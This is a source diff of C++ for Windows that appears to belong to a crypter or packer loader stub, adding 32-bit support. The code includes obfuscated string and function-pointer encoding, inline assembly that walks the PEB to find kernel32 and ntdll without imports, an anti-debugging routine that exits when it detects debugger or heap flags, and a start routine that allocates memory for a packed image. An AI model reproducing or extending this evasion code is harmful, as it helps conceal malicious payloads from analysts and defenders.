@@ -12,6 +12,11 @@
 static char *valuebytes=NULL;
 static HANDLE iMutex;
 
+#ifdef __i386__
+  uint32_t __tls_start __attribute__ ((section (".tls")))=0;
+  uint32_t __tls_end __attribute__ ((section (".tls$ZZZ")))=0;
+#endif // __i386__
+
 #define low_byte(c) ((char)((uint8_t)(c&0x0f)+97))
 #define high_byte(c) ((char)((uint8_t)((c>>4)&0x0f)+97))
 template <char c> struct enc_a{ enum{ v=(char)low_byte( swapbytes[(uint8_t)c]) }; };
@@ -149,8 +154,14 @@ static HINSTANCE huser32,hshell32,hgdi32,hadvapi32,hkernel32,hntdll;
 #define GET_TIME_LAST_2BYTES(s) ((uint32_t)((s).QuadPart&0xffff))
 #define GET_TIME_LAST_BIT(s) ((uint32_t)((s).QuadPart&1))
 static volatile uint32_t seed=0;
-#define _f(f) (void *)(((uint64_t)f^(uint64_t)(ffs[0]?seed:(ffs[1]?seed:0))^(uint64_t)F_0^((uint64_t)ffs[(seed)&0xff]())^\
-(((uint64_t)ffs[(seed>>8)&0xff]())<<8)^((uint64_t)ffs[(seed>>16)&0xff]())<<16)^(((uint64_t)ffs[(seed>>24)&0xff]())<<24))
+#ifdef __i386__
+  #define _f(f) ((void *)((uint32_t)f^(ffs[0]?seed:(ffs[1]?seed:0))^F_0^((uint32_t)ffs[(seed)&0xff]())^\
+  (((uint32_t)ffs[(seed>>8)&0xff]())<<8)^(((uint32_t)ffs[(seed>>16)&0xff]())<<16)^(((uint32_t)ffs[(seed>>24)&0xff]())<<24)))
+#endif // __i386__
+#ifdef __x86_64__
+  #define _f(f) (void *)(((uint64_t)f^(uint64_t)(ffs[0]?seed:(ffs[1]?seed:0))^(uint64_t)F_0^((uint64_t)ffs[(seed)&0xff]())^\
+  (((uint64_t)ffs[(seed>>8)&0xff]())<<8)^((uint64_t)ffs[(seed>>16)&0xff]())<<16)^(((uint64_t)ffs[(seed>>24)&0xff]())<<24))
+#endif // __x86_64__
 
 __fdecl double pi(uint32_t t){
   double p=0.0;
@@ -263,6 +274,18 @@ __fdecl void get_module_name(HMODULE m,char *l){
 };
 
 __fdecl void get_handles(){
+#ifdef __i386__
+  __asm__ volatile(
+    "mov %2       , %0\n\t"
+    "mov 0x0C(%0) , %0\n\t"
+    "mov 0x14(%0) , %0\n\t"
+    "mov (%0)     , %0\n\t"
+    "mov 0x10(%0) , %1\n\t"
+    "mov (%0)     , %0\n\t"
+    "mov 0x10(%0) , %0\n\t"
+    : "=r"(hkernel32), "=r" (hntdll) : "r" (ppeb));
+#endif // __i386__
+#ifdef __x86_64__
   PLDR_DATA_TABLE_ENTRY ldrDataTableEntry=NULL;
   ldrDataTableEntry=CONTAINING_RECORD(ppeb->Ldr->InMemoryOrderModuleList.Flink->Flink,
                                       LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks);
@@ -270,6 +293,7 @@ __fdecl void get_handles(){
   ldrDataTableEntry=CONTAINING_RECORD(ppeb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink,
                                       LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks);
   hkernel32=(HMODULE)ldrDataTableEntry->DllBase;
+#endif // __x86_64__
 };
 
 __fdecl void *gpa(HMODULE m,const char *f){
@@ -843,6 +867,22 @@ __fdecl void free_mem(){
 };
 
 __fdecl void dbg(){
+#ifdef __i386__
+  uint32_t pNtGlobalFlag,pFlags=0,pForceFlags=0;
+  __asm__ volatile(
+    "mov %3       , %0\n\t"
+    "mov 0x68(%0) , %2\n\t"
+    "mov 0x18(%0) , %0\n\t"
+    "mov 0x40(%0) , %1\n\t"
+    "mov 0x44(%0) , %0\n\t"
+    : "=r"(pForceFlags), "=r"(pFlags), "=r"(pNtGlobalFlag) : "r" (ppeb));
+  if((pNtGlobalFlag&0x70)||(pFlags&~HEAP_GROWABLE)||pForceFlags){
+    free_mem();
+    if(iMutex) CloseHandle(iMutex);
+    ExitProcess(1);
+  };
+#endif // __i386__
+#ifdef __x86_64__
   DWORD NtGlobalFlag=0;
   NtGlobalFlag=*(PDWORD)((PBYTE)ppeb+0xBC);
   PINT64 pProcHeap=(PINT64)((PBYTE)ppeb+0x30);
@@ -853,6 +893,7 @@ __fdecl void dbg(){
     if(iMutex) CloseHandle(iMutex);
     ExitProcess(1);
   };
+#endif // __x86_64__
   return;
 };
 
@@ -992,7 +1033,7 @@ __fdecl void init(){
   fsd=(FSD)get_fn_ptr(hadvapi32,f0039);
 };
 
-extern "C" void start(){
+extern "C" void __stdcall start(){
   init();
   uint32_t res_size=0;
   image=(uint8_t*)LocalAlloc(LMEM_ZEROINIT,image_size);
